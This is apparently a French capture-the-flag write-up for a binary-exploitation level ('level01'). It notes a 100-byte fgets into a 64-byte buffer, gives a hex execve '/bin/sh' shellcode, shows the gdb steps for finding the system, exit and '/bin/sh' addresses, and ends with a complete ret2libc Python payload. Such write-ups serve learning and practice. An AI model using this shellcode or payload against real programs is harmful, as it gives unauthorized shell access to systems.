on execute level01

un admin promt qui demande un user

on commence par traduire ASM => C

Pour commencer les deux fonctions de verification ne verifient que les 7 ou 5 premiers charactere des arguments
On pourra peut-etre infiltrer un exploit dans les 249 char disponible dans l'username

Ensuite la condition de verification de mdp sert juste a rien, il n'y a aucun appel a system rien du coup on sait qu'il faut un shellcode

shellcode: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80

Le fgets recupere 100 charactere alors que le buffer est de 64 on peut donc utiliser cette faille pour overwrite l'eip

maintenant on va utiliser la technique ret2lib pour ca il nous faut exit, system et /bin/sh

(j'arrivais pas a faire avec un shellcode dans le buffer)

eip = 0xffffd60c;
buffer = 0xffffd5bc;
padding = eip - bufferAddr = 0x50 = 80

pour bin sh
(gdb) info proc map
ensuite on cherche dans chaque ligne
spoiler il faut:
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
(gdb) x/s resultat

pour system et exit
(gdb) info function system
(gdb) info function exit

system = 0xf7e6aed0
exit = 0xf7e5eb70
bin/sh = 0xf7f897ec

PAYLOAD TIME

python -c 'print "dat_wil\n" + "." * 80 + "\xd0\xae\xe6\xf7\x70\xeb\xe5\xf7\xec\x97\xf8\xf7"'

username\n pour passer le premier 
padding
system + exit + "/bin/sh"